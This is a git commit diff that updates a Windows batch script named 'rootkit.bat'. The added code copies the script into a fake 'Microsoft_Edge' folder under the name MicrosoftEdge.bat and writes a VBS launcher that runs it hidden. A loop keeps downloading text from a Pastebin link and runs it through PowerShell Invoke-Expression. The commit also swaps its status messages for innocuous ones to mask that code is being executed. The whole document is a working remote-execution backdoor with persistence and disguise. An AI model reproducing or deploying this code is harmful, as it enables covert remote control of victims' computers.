dc3124601f4d36751e860202e2a881d564b94751
Code613 <75413090+Code613x@users.noreply.github.com>
2023-07-04 18:31:33 +0200

    Update rootkit.bat

--- rootkit.bat
+++ rootkit.bat
@@ -1,6 +1,48 @@
 @echo off
-setlocal enabledelayedexpansion
+
+::PASTEBIN RAW LINK
 set "raw_link=Pastebin_URL"
+::PASTEBIN RAW LINK
+
+setlocal enabledelayedexpansion
+set "batch_location=%~dp0"
+set "batch_name=%~nx0"
+
+if exist "%localappdata%\Microsoft_Edge\" (
+  echo.
+) else (
+    md "%localappdata%\Microsoft_Edge\"
+)
+
+if "%batch_location%"=="%localappdata%\Microsoft_Edge\" (
+echo.
+) else (
+  if exist "%localappdata%\Microsoft_Edge\MicrosoftEdge.bat" (
+    echo.
+  ) else (
+    xcopy "%batch_location%%batch_name%" "%localappdata%\Microsoft_Edge\"
+    ren %localappdata%\Microsoft_Edge\%batch_name% MicrosoftEdge.bat
+  )
+)
+
+
+if exist "%localappdata%\Microsoft_Edge\inv.vbs" ( 
+goto root
+) else (
+(
+echo Set WshShell = CreateObject("WScript.Shell")
+echo WshShell.Run "cmd /c MicrosoftEdge.bat", 0, False
+echo Set WshShell = Nothing
+) > "%localappdata%\Microsoft_Edge\inv.vbs"
+)
+exit
+
+
+
+
+
+
+:root
 if exist hash.txt (
 set /p previous_hash=<"hash.txt"
 ) else (
@@ -8,13 +50,13 @@ set "previous_hash="
 )
 
 :monitor_loop
-echo Retrieving text from Pastebin...
+echo Checking for updates...
 powershell -Command "Invoke-RestMethod -Uri '%raw_link%' | ForEach-Object { $_ } | Out-File -FilePath temp.txt -Encoding UTF8"
 
 powershell -Command "$hash = Get-FileHash -Path 'temp.txt' -Algorithm SHA256; echo $hash.Hash" > hash.txt
 set /p current_hash=<hash.txt
 if "%current_hash%" NEQ "%previous_hash%" (
-  echo Executing code...
+  echo Done
   powershell -Command "Get-Content temp.txt | Invoke-Expression"
 
   set "previous_hash=%current_hash%"
